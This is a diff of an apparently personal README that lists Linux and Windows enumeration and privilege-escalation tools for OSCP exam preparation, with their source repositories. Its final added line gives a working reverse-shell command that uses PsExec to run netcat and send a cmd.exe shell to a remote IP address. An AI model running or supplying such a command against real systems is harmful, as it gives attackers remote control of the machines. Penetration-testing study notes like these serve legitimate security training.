@@ -1,13 +1,19 @@
-GATHERED TOOLS THAT ARE USEFUL FOR ENUMERATION!
+# GATHERED TOOLS THAT ARE USEFUL FOR OSCP !!
 
+
+
+## Scanning
 
 - nmapAutomator.sh
+
+	- removed nikto and gobust parts, since sparta does nikto and i prefer to gobust separately, when needed.
 
 from https://github.com/21y4d/nmapAutomator
 
 
-# Post-Exploitation more enums !~ !~ !!
-## Linux
+## Post-Exploitation enums !~ !~ !!
+
+### Linux
 
 - linenum.sh
 
@@ -21,10 +27,24 @@ from https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivche
 
 from pentestmonkey
 
-## Windows 
+### Windows 
 
-- Powerless.bat
+- Powerless.bat |  cmd shell enum (for scenarios without PowerShell)
 
 from https://github.com/M4ximuss/Powerless
 
-cmd shell enum (for scenarios without PowerShell)
+- windows-exploit-suggester.py
+
+- windows-privesc-check2.exe
+
+- accesschk5.2.exe |  backward compatible for use alongside fuzzy security's walkthrough
+
+
+## Privilege escalation tools
+
+### Windows
+
+- PsExec.exe / PsExec64.exe |  to run with elevated accounts
+
+	- eg  PsExec64.exe \\DOMAIN -u USERNAME -p PASSWORD nc.exe -e cmd.exe 10.11.0.106 80 
+
